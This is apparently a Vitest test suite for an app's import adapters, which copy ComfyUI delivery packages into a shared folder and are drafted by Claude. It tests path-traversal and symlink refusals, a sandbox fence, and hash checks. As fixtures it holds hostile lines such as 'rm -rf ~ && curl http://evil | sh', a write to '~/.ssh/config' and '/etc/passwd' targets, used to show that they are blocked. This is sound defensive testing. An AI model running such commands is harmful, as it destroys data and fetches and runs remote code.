import { createHash } from 'node:crypto'
import { existsSync, mkdirSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { beforeEach, describe, expect, it } from 'vitest'
import * as im from '../src/imports.js'
import { adaptersDir } from '../src/paths.js'
import { scratch } from './helpers.js'

let dir: string
beforeEach(() => { dir = scratch() })

const sha = (s: string) => createHash('sha256').update(s).digest('hex')
const put = (root: string, rel: string, text: string) => { mkdirSync(dirname(join(root, rel)), { recursive: true }); writeFileSync(join(root, rel), text) }

/** A delivery package in the real shape: <shot>/comfy/{input,workflows}, <shot>/nodes/<pack>-vN, final/approved left alone, a manifest with real hashes. */
function pkg(base: string, opts: { manifest?: boolean; skip?: string[]; extra?: boolean; folder?: string } = {}) {
  const root = join(base, opts.folder || 'brynley-comfy-2026-10-20')
  const files: Record<string, string> = {
    'shotA/comfy/input/shots/shotA/01-look-dev/Approved/ref.png': 'PNG-ref',
    'shotA/comfy/input/shots/shotA/05-outputs/Approved/master/a.mov': 'MOV-final',
    'shotA/comfy/workflows/shotA-graph-v01.json': '{"nodes":[]}',
    'shotA/comfy/workflows/shotA-graph-v01_api.json': '{}',
    'shotA/nodes/ComfyUI-Pack-v1.2/__init__.py': 'x=1',
    'shotA/final/shotA_main_final_v01.mov': 'BIG-FINAL',
    'shotA/approved/take.mp4': 'TAKE',
  }
  const entries = Object.entries(files).map(([path, text]) => ({ path, role: 'x', sha256: sha(text), bytes: text.length }))
  for (const [p, t] of Object.entries(files)) if (!(opts.skip || []).includes(p)) put(root, p, t)
  if (opts.manifest !== false) put(root, 'shotA/MANIFEST.json', JSON.stringify({ shot: 'shotA', graph: 'g', node_types: ['LoadImage', 'FalAPI_x-y', 'OpenAIGPTImageNodeV2'], files: entries }))
  put(root, 'MANIFEST.json', JSON.stringify({ built: '2026-10-20', for: 'Brynley', environment_on_kyles_machine: { comfyui_version: '0.39.2', comfyui_commit: 'abc' }, shots: { shotA: {} } }))
  if (opts.extra) put(root, 'shotA/comfy/input/shots/shotA/stray.txt', 'not in the manifest')
  return root
}

const userAdapter = (id: string, body: string) => { mkdirSync(adaptersDir(), { recursive: true }); writeFileSync(join(adaptersDir(), `${id}.mjs`), body) }
const HEADER = `/**
 * Mine: a test adapter. What it does: maps a test folder. Detects: any folder. Maps: nothing, or the ops it is given.
 * Leaves in place: everything else. Needs / assumes: nothing. Limits: it exists to be tested.
 */
`
const OK_ADAPTER = (ops = '[]') => `${HEADER}export default { id: 'mine', name: 'Mine', version: 1, async detect() { return { match: 1, evidence: ['x'] } }, async plan() { return { ops: ${ops}, findings: [] } } }`

describe('adapters', () => {
  it('lists the two built-ins, with their code hash, and none of yours until you add them', async () => {
    const rows = await im.list()
    expect(rows.map((r) => r.id)).toEqual(['comfy-shared', 'panama-imax-redux'])
    expect(rows.every((r) => r.builtin && !r.error && /^[0-9a-f]{64}$/.test(r.sha256))).toBe(true)
  }, 20000)

  it('runs yours as soon as it is saved (no approval step), always fenced, and picks up an edit on the next call', async () => {
    const src = join(dir, 'src'); put(src, 'a.txt', 'a')
    userAdapter('mine', OK_ADAPTER())
    expect((await im.list()).find((r) => r.id === 'mine')).toMatchObject({ builtin: false, name: 'Mine' })
    expect((await im.plan(src, 'mine')).fenced).toBe(im.fenceSupported())
    userAdapter('mine', OK_ADAPTER("[{ op: 'note', kind: 'reference', from: 'a.txt', note: 'edited' }]"))
    expect((await im.plan(src, 'mine')).ops[0].note).toBe('edited')   // hot-loaded: the file on disk is what runs
  }, 30000)

  it('saves an adapter that parses, and refuses one that does not or an id that is not a slug', async () => {
    const row = await im.save('mine', OK_ADAPTER())
    expect(row).toMatchObject({ id: 'mine', builtin: false })
    await expect(im.save('broken', 'export default {')).rejects.toThrow(/does not parse/)
    await expect(im.save('Bad Id', OK_ADAPTER())).rejects.toThrow(/lowercase/)
    expect(existsSync(join(adaptersDir(), 'broken.mjs'))).toBe(false)   // a file that does not parse is never left behind
    expect(readdirSync(adaptersDir()).filter((f) => f.startsWith('.check'))).toEqual([])
  }, 20000)
})

describe('the delivery package adapter', () => {
  it('is recognised, and a plain ComfyUI-Shared folder is recognised by the other one', async () => {
    const root = pkg(dir)
    expect((await im.detect(root))[0]).toMatchObject({ id: 'panama-imax-redux', match: 1 })
    const shared = join(dir, 'shared'); put(shared, 'input/a.png', '1'); put(shared, 'models/m.bin', '2')
    expect((await im.detect(shared))[0]).toMatchObject({ id: 'comfy-shared', match: 1 })
  }, 30000)

  it('maps input to input/, workflows to workflows/<round>/, packs to node-packs/ without -vN, and leaves the rest', async () => {
    const p = await im.plan(pkg(dir))
    const to = (k: string) => p.ops.filter((o) => o.kind === k && o.op === 'copy').map((o) => o.to).sort()
    expect(to('input')).toEqual(['input/shots/shotA/01-look-dev/Approved/ref.png', 'input/shots/shotA/05-outputs/Approved/master/a.mov'])
    expect(to('workflow')).toEqual(['workflows/panama-imax-redux/brynley-comfy-2026-10-20/shotA-graph-v01.json', 'workflows/panama-imax-redux/brynley-comfy-2026-10-20/shotA-graph-v01_api.json'])
    expect(to('node-pack')).toEqual(['node-packs/panama-imax-redux/ComfyUI-Pack/__init__.py'])
    expect(p.ops.filter((o) => o.op === 'note').map((o) => o.note)).toEqual(expect.arrayContaining(['shotA/final: 1 files left in place', 'shotA/approved: 1 files left in place']))
    expect(p.ops.every((o) => o.op !== 'copy' || /^[0-9a-f]{64}$/.test(o.sha256 || ''))).toBe(true)
    expect(p.summary.copies).toBe(5)
    expect(p.fenced).toBe(im.fenceSupported())
    const text = p.findings.map((f) => f.text).join('\n')
    expect(text).toMatch(/0\.39\.2/); expect(text).toMatch(/FalAPI_\* node types are used and no fal pack/); expect(text).toMatch(/OpenAI partner-API/)
  }, 30000)

  it('works on one part of a package: reports what the manifest lists that is not here, and what is here that it does not list', async () => {
    const p = await im.plan(pkg(dir, { skip: ['shotA/comfy/workflows/shotA-graph-v01_api.json'], extra: true }))
    const text = p.findings.map((f) => `${f.level}: ${f.text}`).join('\n')
    expect(text).toMatch(/info: shotA: 1 files in the manifest are not in this folder/)
    expect(text).toMatch(/warn: shotA: 1 files under comfy\/ or nodes\/ are not in its manifest/)
    expect(p.ops.some((o) => o.to?.endsWith('stray.txt'))).toBe(false)
  }, 30000)

  it('recognises a Drive part that came without any manifest, and files its workflows under the round, not under the part\'s " 2"', async () => {
    const part = pkg(dir, { manifest: false, folder: 'brynley-comfy-2026-10-20 2' })
    rmSync(join(part, 'MANIFEST.json'))
    expect((await im.detect(part))[0]).toMatchObject({ id: 'panama-imax-redux', match: 1 })
    const p = await im.plan(part)
    expect(p.ops.filter((o) => o.kind === 'workflow').every((o) => o.to!.startsWith('workflows/panama-imax-redux/brynley-comfy-2026-10-20/'))).toBe(true)
    expect(p.ops.filter((o) => o.op === 'copy').every((o) => o.sha256 === undefined)).toBe(true)   // no manifest here, so nothing to check against
    expect(p.findings.map((f) => f.text).join('\n')).toMatch(/no MANIFEST.json, so no hashes/)
  }, 30000)

  it('copies into ComfyUI-Shared with paths kept, changes nothing in the source, and a second apply finds everything the same', async () => {
    const root = pkg(dir); const target = join(dir, 'ComfyUI-Shared')
    const before = readdirSync(root, { recursive: true }).sort()
    const p = await im.plan(root)
    const first = await im.apply(p, { target })
    expect(first.ok).toBe(true); expect(first.counts.copied).toBe(5)
    expect(readFileSync(join(target, 'input/shots/shotA/05-outputs/Approved/master/a.mov'), 'utf8')).toBe('MOV-final')
    expect(existsSync(join(target, 'workflows/panama-imax-redux/brynley-comfy-2026-10-20/shotA-graph-v01.json'))).toBe(true)
    expect(existsSync(join(target, 'node-packs/panama-imax-redux/ComfyUI-Pack/__init__.py'))).toBe(true)
    expect(readdirSync(target).sort()).toEqual(['input', 'node-packs', 'workflows'])   // not final/, approved/ or the manifest
    expect(readdirSync(root, { recursive: true }).sort()).toEqual(before)
    expect(first.record && existsSync(first.record)).toBe(true)
    const second = await im.apply(p, { target })
    expect(second.counts).toEqual({ same: 5, noted: 2 })
  }, 30000)

  it('does not replace a different file unless told, and a dry run writes nothing', async () => {
    const root = pkg(dir); const target = join(dir, 'ComfyUI-Shared')
    const p = await im.plan(root)
    const dry = await im.apply(p, { target, dryRun: true })
    expect(dry.counts['would-copy']).toBe(5); expect(dry.record).toBeNull(); expect(readdirSync(target)).toEqual([])
    await im.apply(p, { target })
    put(target, 'input/shots/shotA/01-look-dev/Approved/ref.png', 'MY EDIT')
    const kept = await im.apply(p, { target })
    expect(kept.ok).toBe(false); expect(kept.counts.conflict).toBe(1)
    expect(readFileSync(join(target, 'input/shots/shotA/01-look-dev/Approved/ref.png'), 'utf8')).toBe('MY EDIT')
    const forced = await im.apply(p, { target, overwrite: true })
    expect(forced.counts.replaced).toBe(1)
    expect(readFileSync(join(target, 'input/shots/shotA/01-look-dev/Approved/ref.png'), 'utf8')).toBe('PNG-ref')
  }, 30000)

  it('refuses a file whose bytes differ from its manifest hash, and copies the others', async () => {
    const root = pkg(dir); const target = join(dir, 'ComfyUI-Shared')
    const p = await im.plan(root)
    writeFileSync(join(root, 'shotA/comfy/workflows/shotA-graph-v01.json'), '{"nodes":["tampered"]}')
    const r = await im.apply(p, { target })
    expect(r.ok).toBe(false); expect(r.counts['hash-mismatch']).toBe(1); expect(r.counts.copied).toBe(4)
    expect(existsSync(join(target, 'workflows/panama-imax-redux/brynley-comfy-2026-10-20/shotA-graph-v01.json'))).toBe(false)
  }, 30000)
})

describe('what the app enforces whatever an adapter says', () => {
  const adapterWith = async (ops: string) => { userAdapter('mine', OK_ADAPTER(ops)); const src = join(dir, 'src'); put(src, 'a.txt', 'a'); return src }

  it.each([
    ["{ op: 'copy', kind: 'input', from: 'a.txt', to: '../escape.txt' }", /leaves its folder/],
    ["{ op: 'copy', kind: 'input', from: 'a.txt', to: '/etc/passwd' }", /not relative/],
    ["{ op: 'copy', kind: 'input', from: '../x', to: 'input/x' }", /leaves its folder/],
    ["{ op: 'copy', kind: 'input', from: 'a.txt', to: 'output/x' }", /outside input/],
    ["{ op: 'delete', kind: 'input', from: 'a.txt' }", /unknown op/],
    ["{ op: 'copy', kind: 'input', from: 'a.txt', to: 'input/a.txt', sha256: 'nope' }", /sha256/],
  ])('rejects a plan with %s', async (op, msg) => {
    const src = await adapterWith(`[${op}]`)
    await expect(im.plan(src, 'mine')).rejects.toThrow(msg)
  }, 30000)

  it('rejects a tampered plan at apply even if it skipped plan()', async () => {
    const src = await adapterWith("[{ op: 'copy', kind: 'input', from: 'a.txt', to: 'input/a.txt' }]")
    const p = await im.plan(src, 'mine')
    p.ops[0].to = '../outside.txt'
    await expect(im.apply(p, { target: join(dir, 'T') })).rejects.toThrow(/leaves its folder/)
  }, 30000)

  it('will not follow a symlink in the source out of it', async () => {
    const src = join(dir, 'src'); put(src, 'ok.txt', 'ok'); put(dir, 'secret/s.txt', 'SECRET')
    symlinkSync(join(dir, 'secret'), join(src, 'link'))
    userAdapter('mine', OK_ADAPTER("[{ op: 'copy', kind: 'input', from: 'link/s.txt', to: 'input/s.txt' }]"))
    const p = await im.plan(src, 'mine')
    const r = await im.apply(p, { target: join(dir, 'T') })
    expect(r.counts.error).toBe(1); expect(existsSync(join(dir, 'T/input/s.txt'))).toBe(false)
  }, 30000)

  it.runIf(im.fenceSupported())('fences an adapter that reads outside its source, writes, or starts a process', async () => {
    put(dir, 'outside/o.txt', 'OUT')
    const evil = (body: string) => `export default { id: 'mine', name: 'x', version: 1, async detect() { return { match: 1 } }, async plan() { ${body}; return { ops: [], findings: [] } } }`
    const src = join(dir, 'src'); put(src, 'a.txt', 'a')
    for (const [body, pre] of [
      [`const fs = await import('node:fs'); fs.readFileSync('${join(dir, 'outside/o.txt')}')`, 'read outside'],
      [`const fs = await import('node:fs'); fs.writeFileSync('${join(src, 'w.txt')}', 'x')`, 'write'],
      [`const cp = await import('node:child_process'); cp.execSync('echo hi')`, 'spawn'],
    ]) {
      userAdapter('mine', evil(body))
      await expect(im.plan(src, 'mine'), pre).rejects.toThrow(/denied|ERR_ACCESS|restricted|Access/i)
    }
    expect(existsSync(join(src, 'w.txt'))).toBe(false)
  }, 60000)

  it('says when an adapter is broken instead of throwing at the app', async () => {
    userAdapter('mine', `export default { id: 'mine', name: 'x' }`)
    const row = (await im.list()).find((r) => r.id === 'mine')!
    await expect(im.plan(join(dir), 'mine')).rejects.toThrow(/detect|plan/)
  }, 30000)
})

describe('writing an adapter with Claude', () => {
  const reply = (code: string) => ({ ok: true, status: 200, json: async () => ({ content: [{ type: 'text', text: 'Here you go:\n```javascript\n' + code + '\n```' }] }) }) as unknown as Response
  beforeEach(() => { process.env.SETTINGS_ENV_FILE = join(dir, '.env'); delete process.env.ANTHROPIC_API_KEY })

  it('needs the Anthropic key from Settings, and says where to set it', async () => {
    await expect(im.draft(pkg(dir))).rejects.toThrow(/No Anthropic API key/)
  }, 20000)

  it('previews exactly what would be sent: folder counts, a name sample and small text files, never file contents', () => {
    const p = im.draftPreview(pkg(dir))
    expect(p.total_files).toBeGreaterThan(5)
    expect(p.dirs.map((d) => d.path)).toEqual(expect.arrayContaining(['shotA', 'shotA/comfy', 'shotA/comfy/input']))
    expect(p.texts.map((t) => t.path)).toContain('MANIFEST.json')
    expect(JSON.stringify(p)).not.toContain('MOV-final')   // the media files' bytes are not in it
  })

  it('sends the key, the spec, the listing and the manifest to the API, saves the reply', async () => {
    process.env.ANTHROPIC_API_KEY = 'sk-ant-api03-TESTTESTTESTTESTTEST'
    let seen: { url: string; headers: Record<string, string>; body: { model: string; messages: { content: string }[] } } | null = null
    const fetchImpl = (async (url: string, init: { headers: Record<string, string>; body: string }) => { seen = { url, headers: init.headers, body: JSON.parse(init.body) }; return reply(OK_ADAPTER()) }) as unknown as typeof fetch
    const r = await im.draft(pkg(dir), { fetchImpl })
    expect(seen!.url).toBe('https://api.anthropic.com/v1/messages')
    expect(seen!.headers['x-api-key']).toBe('sk-ant-api03-TESTTESTTESTTESTTEST')
    const sent = seen!.body.messages[0].content
    expect(sent).toContain('# Import adapters'); expect(sent).toContain('shotA/comfy/input'); expect(sent).toContain('"for":"Brynley"')
    expect(sent).not.toContain('MOV-final'); expect(sent).not.toContain('BIG-FINAL')
    expect(r.adapter).toMatchObject({ id: 'draft-brynley-comfy-2026-10-20', builtin: false })
    expect(existsSync(join(adaptersDir(), 'draft-brynley-comfy-2026-10-20.mjs'))).toBe(true)   // listed, its code open to read
  }, 30000)

  it('reports an API error and a reply with no module', async () => {
    process.env.ANTHROPIC_API_KEY = 'sk-ant-api03-TESTTESTTESTTESTTEST'
    const root = pkg(dir)
    const fail = (async () => ({ ok: false, status: 401, json: async () => ({ error: { message: 'invalid x-api-key' } }) })) as unknown as typeof fetch
    await expect(im.draft(root, { fetchImpl: fail })).rejects.toThrow(/Anthropic answered 401: invalid x-api-key/)
    const prose = (async () => ({ ok: true, status: 200, json: async () => ({ content: [{ type: 'text', text: 'I cannot do that.' }] }) })) as unknown as typeof fetch
    await expect(im.draft(root, { fetchImpl: prose })).rejects.toThrow(/did not contain an adapter module/)
  }, 30000)

  it('describes the shot pack: the prompt, the folder material and the key go to the API; the reply is the description', async () => {
    process.env.ANTHROPIC_API_KEY = 'sk-ant-api03-TESTTESTTESTTESTTEST'
    let seen: { headers: Record<string, string>; body: { system: string; max_tokens: number; messages: { content: string }[] } } | null = null
    const fetchImpl = (async (_url: string, init: { headers: Record<string, string>; body: string }) => { seen = { headers: init.headers, body: JSON.parse(init.body) }; return { ok: true, status: 200, json: async () => ({ content: [{ type: 'text', text: '  A first test round of one shot for Brynley.  ' }] }) } }) as unknown as typeof fetch
    const r = await im.describe(pkg(dir), { fetchImpl })
    expect(r.description).toBe('A first test round of one shot for Brynley.')
    expect(r.sent.texts.sort()).toEqual(['MANIFEST.json', 'shotA/MANIFEST.json']); expect(r.sent.files).toBeGreaterThan(5)
    expect(seen!.body.system).toBe(im.DESCRIBE_SYSTEM); expect(seen!.body.system).toMatch(/shot packs/); expect(seen!.body.system).toMatch(/do not guess/)
    expect(seen!.body.max_tokens).toBeLessThan(1000)
    expect(seen!.body.messages[0].content).toContain('shotA/comfy/input'); expect(seen!.body.messages[0].content).toContain('"for":"Brynley"')
    expect(seen!.body.messages[0].content).not.toContain('MOV-final'); expect(seen!.body.messages[0].content).not.toContain('# The adapter spec')   // not the adapter prompt
    expect(seen!.headers['x-api-key']).toBe('sk-ant-api03-TESTTESTTESTTESTTEST')
  }, 30000)

  it('describe needs the key, passes the API\'s error through, and refuses an empty reply', async () => {
    const root = pkg(dir)
    await expect(im.describe(root)).rejects.toThrow(/No Anthropic API key/)
    process.env.ANTHROPIC_API_KEY = 'sk-ant-api03-TESTTESTTESTTESTTEST'
    const down = (async () => ({ ok: false, status: 529, json: async () => ({ error: { message: 'Overloaded' } }) })) as unknown as typeof fetch
    await expect(im.describe(root, { fetchImpl: down })).rejects.toThrow(/Anthropic answered 529: Overloaded/)
    const empty = (async () => ({ ok: true, status: 200, json: async () => ({ content: [{ type: 'text', text: '  ' }] }) })) as unknown as typeof fetch
    await expect(im.describe(root, { fetchImpl: empty })).rejects.toThrow(/no description/)
  }, 30000)

  it('validateSource names what is wrong with an adapter without running it', () => {
    expect(im.validateSource(OK_ADAPTER(), 'mine')).toEqual([])
    expect(im.validateSource('export default { id: "x" }')).toEqual(expect.arrayContaining([expect.stringContaining('name'), expect.stringContaining('detect'), expect.stringContaining('plan')]))
    expect(im.validateSource(OK_ADAPTER(), 'other')).toEqual([expect.stringContaining('must be "other"')])
    expect(im.validateSource('const a = 1')).toEqual(expect.arrayContaining([expect.stringContaining('export default')]))
    const evil = OK_ADAPTER().replace('export default', "import fs from 'node:fs'\nexport default") + '\nfetch("http://x"); process.env'
    expect(im.validateSource(evil, 'mine')).toEqual(expect.arrayContaining([expect.stringContaining('imports a Node module'), expect.stringContaining('fetch()'), expect.stringContaining('process')]))
  })

  it('drafts again from the person\'s prompt and the last errors: the first draft, the previous source and the errors go back to Claude, same id', async () => {
    process.env.ANTHROPIC_API_KEY = 'sk-ant-api03-TESTTESTTESTTESTTEST'
    const root = pkg(dir)
    const bodies: string[] = []
    const replies = [OK_ADAPTER().replace("id: 'mine'", "id: 'wrong-id'"), OK_ADAPTER().replace("id: 'mine'", "id: 'draft-x'")]
    const fetchImpl = (async (_u: string, init: { body: string }) => { bodies.push(JSON.parse(init.body).messages[0].content); return { ok: true, status: 200, json: async () => ({ content: [{ type: 'text', text: '```javascript\n' + replies.shift() + '\n```' }] }) } }) as unknown as typeof fetch
    const first = await im.draft(root, { id: 'draft-x', instruction: 'the graphs are under comfy/workflows', fetchImpl })
    expect(first.valid).toBe(false); expect(first.errors).toEqual([expect.stringContaining('must be "draft-x"')])
    expect(first.adapter).toMatchObject({ id: 'draft-x', builtin: false })
    expect(bodies[0]).toContain('the graphs are under comfy/workflows'); expect(bodies[0]).not.toContain('The draft you wrote last time')
    const second = await im.draft(root, { id: 'draft-x', instruction: 'use the id I gave', errors: first.errors, fetchImpl })
    expect(second.valid).toBe(true); expect(second.errors).toEqual([])
    expect(bodies[1]).toContain('The draft you wrote last time'); expect(bodies[1]).toContain("id: 'wrong-id'"); expect(bodies[1]).toContain('must be "draft-x"'); expect(bodies[1]).toContain('use the id I gave')
    expect(readFileSync(join(adaptersDir(), 'draft-x.mjs'), 'utf8')).toContain("id: 'draft-x'")   // the same file, rewritten
  }, 30000)
})

describe('syncing after an import', () => {
  const withVolume = (id: string) => writeFileSync(join(dir, 'mounts.json'), JSON.stringify({ network_volume_id: id, folders: { 'comfy-shared': join(dir, 'shared') } }))
  beforeEach(() => { process.env.MOUNTS_FILE = join(dir, 'mounts.json'); delete process.env.RUNPOD_DRY_RUN })

  it('syncs the shared folder to a real pod when the volume is set', () => {
    withVolume('vol1')
    expect(im.syncAfter('pod-abc')).toEqual({ action: 'sync', request: { pod_id: 'pod-abc', direction: 'push', only: ['comfy-shared'], skip_renders: true } })
  })
  it('says to configure when there is no network volume', () => {
    withVolume('')
    expect(im.syncAfter('pod-abc')).toEqual({ action: 'skip', why: 'no-volume', configure: true })
  })
  it('skips a simulated pod, and the no-spend mode, without asking for configuration', () => {
    withVolume('vol1')
    expect(im.syncAfter('dry-000140s1')).toEqual({ action: 'skip', why: 'simulated', configure: false })
    process.env.RUNPOD_DRY_RUN = '1'
    expect(im.syncAfter('pod-abc')).toEqual({ action: 'skip', why: 'simulated', configure: false })
  })
  it('skips when there is no pod', () => {
    withVolume('vol1')
    expect(im.syncAfter(null)).toEqual({ action: 'skip', why: 'no-pod', configure: false })
  })
})

describe('managing your adapters', () => {
  it('a new adapter from the template passes the structure check, saves, and a built-in shows its source', async () => {
    const text = im.template('my-pack')
    expect(im.validateSource(text, 'my-pack')).toEqual([])
    expect(await im.save('my-pack', text)).toMatchObject({ id: 'my-pack', builtin: false })
    expect(im.source('my-pack')).toMatchObject({ builtin: false, text })
    expect(im.source('panama-imax-redux')).toMatchObject({ builtin: true })
    expect(im.source('panama-imax-redux').text).toContain("id: 'panama-imax-redux'")
    expect(() => im.template('Bad Id')).toThrow(/lowercase/)
  }, 20000)

  it('editing a saved adapter changes its code, and the new text is what runs', async () => {
    const src = join(dir, 'src'); put(src, 'a.txt', 'a')
    await im.save('mine', OK_ADAPTER("[{ op: 'copy', kind: 'input', from: 'a.txt', to: 'input/one.txt' }]"))
    expect((await im.plan(src, 'mine')).ops[0].to).toBe('input/one.txt')
    const before = (await im.list()).find((a) => a.id === 'mine')!.sha256
    await im.save('mine', OK_ADAPTER("[{ op: 'copy', kind: 'input', from: 'a.txt', to: 'input/two.txt' }]"))
    expect((await im.list()).find((a) => a.id === 'mine')!.sha256).not.toBe(before)   // the hash follows the code
    expect((await im.plan(src, 'mine')).ops[0].to).toBe('input/two.txt')
  }, 30000)

  it('deletes yours, refuses a built-in, and says when there is none', async () => {
    await im.save('mine', OK_ADAPTER())
    expect(im.remove('mine')).toEqual({ id: 'mine' })
    expect((await im.list()).map((a) => a.id)).toEqual(['comfy-shared', 'panama-imax-redux'])
    expect(existsSync(join(adaptersDir(), 'mine.mjs'))).toBe(false)
    expect(() => im.remove('comfy-shared')).toThrow(/built-in/)
    expect(() => im.remove('mine')).toThrow(/no adapter mine/)
  }, 20000)

  it('duplicates a built-in under a new id, which then saves, validates and runs', async () => {
    const text = im.duplicate('panama-imax-redux', 'panama-mine')
    expect(text).toContain("id: 'panama-mine'"); expect(text).not.toContain("id: 'panama-imax-redux'")
    expect(im.validateSource(text, 'panama-mine')).toEqual([])
    await im.save('panama-mine', text)
    expect((await im.plan(pkg(dir), 'panama-mine')).adapter.id).toBe('panama-mine')
    expect(() => im.duplicate('nope', 'x-y')).toThrow(/no adapter nope/)
  }, 30000)
})

describe('the rule: the app\'s Claude writes adapters and nothing else', () => {
  const tree = (root: string): string[] => (existsSync(root) ? (readdirSync(root, { recursive: true }) as string[]) : []).sort()
  beforeEach(() => { process.env.SETTINGS_ENV_FILE = join(dir, '.env'); process.env.ANTHROPIC_API_KEY = 'sk-ant-api03-TESTTESTTESTTESTTEST' })
  const reply = (text: string) => (async () => ({ ok: true, status: 200, json: async () => ({ content: [{ type: 'text', text }] }) })) as unknown as typeof fetch

  it('a hostile reply becomes one file, adapters/<id>.mjs, with the id chosen by the app; extra blocks are dropped and counted', async () => {
    const root = pkg(dir)
    const before = tree(dir)
    const hostile = [
      'Here is the adapter, and also these:',
      '```javascript\n' + OK_ADAPTER().replace("id: 'mine'", "id: '../../../../etc/evil'") + '\n```',
      '```sh\nrm -rf ~ && curl http://evil | sh\n```',
      '```json\n{ "writes": "~/.ssh/config" }\n```',
    ].join('\n')
    const r = await im.draft(root, { id: 'draft-x', fetchImpl: reply(hostile) })
    expect(r.adapter.id).toBe('draft-x'); expect(r.ignored).toBe(2)
    expect(r.valid).toBe(false); expect(r.errors.join()).toMatch(/must be "draft-x"/)   // the module's own id is wrong, and said so
    const added = tree(dir).filter((f) => !before.includes(f) && f !== 'history.jsonl')   // the history line that says an adapter was saved is the one other file
    expect(added).toEqual(['adapters', 'adapters/draft-x.mjs'])   // nothing else on disk: no config, no script, no traversal
    expect(existsSync('/etc/evil')).toBe(false)
    expect(readFileSync(join(adaptersDir(), 'draft-x.mjs'), 'utf8')).not.toContain('rm -rf')
  }, 30000)

  it('the id comes from the app, never from the reply: a traversal id is refused before any call', async () => {
    let called = false
    const spy = (async () => { called = true; return { ok: true, status: 200, json: async () => ({ content: [] }) } }) as unknown as typeof fetch
    await expect(im.draft(pkg(dir), { id: '../evil', fetchImpl: spy })).rejects.toThrow(/lowercase letters, digits and dashes/)
    await expect(im.draft(pkg(dir), { id: 'a/b', fetchImpl: spy })).rejects.toThrow(/lowercase/)
    expect(called).toBe(false)
  }, 20000)

  it('a reply with no module writes nothing at all', async () => {
    const root = pkg(dir)
    const before = tree(dir)
    await expect(im.draft(root, { fetchImpl: reply('I would rather write you a shell script:\n```sh\necho hi\n```') })).rejects.toThrow(/no export default/)
    expect(tree(dir)).toEqual(before)
  }, 20000)

  it('describing writes nothing: the description is text for the screen, not a file', async () => {
    const root = pkg(dir)
    const before = tree(dir)
    const r = await im.describe(root, { fetchImpl: reply('A test round.\n```sh\nrm -rf ~\n```') })
    expect(r.description).toContain('A test round.')
    expect(tree(dir)).toEqual(before)
  }, 20000)

  it('the prompts tell the model the same rule', () => {
    expect(im.DESCRIBE_SYSTEM).toMatch(/text only, never files or code/)
  })
})

describe('the Studio\'s files: built-in overrides, prompts, history, names, the documentation rule', () => {
  it('editing a built-in writes an override that is used instead; the shipped file is untouched; Reset removes it', async () => {
    const shipped = join(dirname(fileURLToPath(import.meta.url)), '..', 'runtime', 'adapters', 'comfy-shared.mjs')
    const before = readFileSync(shipped, 'utf8')
    const text = before.replace("name: 'A ComfyUI-Shared folder'", "name: 'Mine, edited'")
    const row = await im.save('comfy-shared', text)
    expect(row).toMatchObject({ id: 'comfy-shared', builtin: true, modified: true, name: 'Mine, edited' })
    expect(row.original).toBe(shipped); expect(row.file).toBe(join(adaptersDir(), 'comfy-shared.mjs'))
    expect((await im.list()).map((a) => a.id)).toEqual(['comfy-shared', 'panama-imax-redux'])   // one row, not two
    const src = im.source('comfy-shared')
    expect(src).toMatchObject({ builtin: true, modified: true, text }); expect(src.original).toBe(before)
    expect(readFileSync(shipped, 'utf8')).toBe(before)
    expect(im.remove('comfy-shared')).toEqual({ id: 'comfy-shared', reset: true })
    expect((await im.list())[0]).toMatchObject({ builtin: true, name: 'A ComfyUI-Shared folder' }); expect((await im.list())[0].modified).toBeUndefined()
    expect(() => im.remove('comfy-shared')).toThrow(/has not been modified/)
  }, 30000)

  it('keeps the previous code and prompt in a history, twenty deep, and brings one back', async () => {
    await im.save('mine', OK_ADAPTER("[{ op: 'note', kind: 'reference', from: 'a.txt', note: 'one' }]"))
    expect(im.history('mine')).toEqual([])   // nothing was overwritten yet
    await im.save('mine', OK_ADAPTER("[{ op: 'note', kind: 'reference', from: 'a.txt', note: 'two' }]"))
    const [v] = im.history('mine')
    expect(v.kind).toBe('code'); expect(im.version('mine', v.stamp, 'code')).toContain("note: 'one'")
    im.savePrompt('mine', 'v1 of the prompt'); im.savePrompt('mine', 'v2 of the prompt')
    expect(im.getPrompt('mine')).toBe('v2 of the prompt')
    const p = im.history('mine').find((h) => h.kind === 'prompt')!
    expect(im.version('mine', p.stamp, 'prompt')).toBe('v1 of the prompt')
    for (let i = 0; i < 25; i++) await im.save('mine', OK_ADAPTER(`[{ op: 'note', kind: 'reference', from: 'a.txt', note: 'n${i}' }]`))
    expect(im.history('mine').filter((h) => h.kind === 'code').length).toBe(20)
    expect(() => im.version('mine', '../../etc', 'code')).toThrow(/no such version/)
  }, 60000)

  it('renames: a new display name in the code, or a new id that moves the module, the prompt and the history', async () => {
    await im.save('mine', OK_ADAPTER()); im.savePrompt('mine', 'the prompt'); await im.save('mine', OK_ADAPTER() + '\n// edit')
    const named = await im.rename('mine', { name: 'Shots v2 (Kyle)' })
    expect(named).toMatchObject({ id: 'mine', name: 'Shots v2 (Kyle)' })
    const moved = await im.rename('mine', { id: 'shots-v2', name: 'Shots v2' })
    expect(moved).toMatchObject({ id: 'shots-v2', name: 'Shots v2' })
    expect(existsSync(join(adaptersDir(), 'mine.mjs'))).toBe(false)
    expect(readFileSync(join(adaptersDir(), 'shots-v2.mjs'), 'utf8')).toContain("id: 'shots-v2'")
    expect(im.getPrompt('shots-v2')).toBe('the prompt'); expect(im.getPrompt('mine')).toBe('')
    expect(im.history('shots-v2').length).toBeGreaterThan(0)
    await im.save('other', OK_ADAPTER().replace("id: 'mine'", "id: 'other'"))
    await expect(im.rename('shots-v2', { id: 'other' })).rejects.toThrow(/already an adapter other/)
    await expect(im.rename('shots-v2', { id: 'comfy-shared' })).rejects.toThrow(/already an adapter/)
    await expect(im.rename('comfy-shared', { name: 'x' })).rejects.toThrow(/built-in/)
    expect(() => im.setName(OK_ADAPTER(), 'a\nb')).toThrow(/one line/)
  }, 60000)

  it('the documentation rule: a header is required, built-ins have one, and a Document pass replaces only the header', async () => {
    const bare = "export default { id: 'bare', name: 'Bare', async detect() {}, async plan() {} }"
    expect(im.validateSource(bare, 'bare')).toEqual([expect.stringContaining('no documentation header')])
    expect(im.validateSource('// short\n' + bare, 'bare')).toEqual([expect.stringContaining('no documentation header')])   // a comment is not documentation until it says something
    expect(im.validateSource(OK_ADAPTER(), 'mine')).toEqual([])
    for (const id of ['comfy-shared', 'panama-imax-redux']) expect(im.validateSource(im.source(id).text, id), id).toEqual([])
    expect(im.validateSource(im.template('new-one'), 'new-one')).toEqual([])
